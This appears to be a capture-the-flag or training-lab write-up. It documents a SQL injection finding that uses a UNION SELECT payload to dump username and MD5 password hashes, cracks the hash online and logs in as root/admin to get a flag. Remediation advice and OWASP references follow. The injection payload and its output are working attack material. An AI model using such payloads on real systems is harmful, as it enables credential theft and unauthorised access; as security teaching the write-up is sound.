# Finding 01 - login - SQL injection

## Exploitability
Easy. Only 2 steps required : inject code in input field, then decrypt md5 using easy-to-find web tool.

## Risk level/type
OWASP top 10 :
- A02:2021 – Cryptographic Failures
	=>" Are deprecated hash functions such as MD5 or SHA1 in use [...] ?"
- A03:2021 – Injection 					vulnerability to SQL injection


## Detailed description of the exploit
From previous SQL injection attempts (findings 2 and 7), we have found a table named "Member_Brute_Force"... let's see if it helps.
In a search input field (images or members), let's use the following SQL command:

```1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default```
which yields :
```
1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default
ID: 1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_

ID: 1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default 
Title: 3bf1114a986ba87ed28fc1b5884fc2f8
Url : root

ID: 1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default 
Title: 3bf1114a986ba87ed28fc1b5884fc2f8
Url : admin
```
Both root and admin have the same password, which look like it was hashed with md5...

Let's use our web tool again:
https://www.md5online.org/md5-decrypt.html
It gives us:
shadow

We can try to login with either combo (root/shadow and admin/shadow) :
We arrive on a page that says:
"The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 "

## Remediation

Input sanitizing is the first step.
There are several ways to sanitize the input, depending on the code architecture (legacy).
The first step is to use prepared statements with parameterized queries
	-> this means that the query would not be evaluated as a command but as a string, looking for an exact match to the string (i.e. a username matching "1 or 1 = 1")
For legacy code, you can also escape all the user input before putting it in a query.

Also, md5 is now deprecated in favor of sha2 algorithms (sha256, sha512) as well as sha3 algorithms.

## Additional resources
https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html

https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html

md5 deprecation notice :
https://www.security-database.com/detail.php?alert=VU836068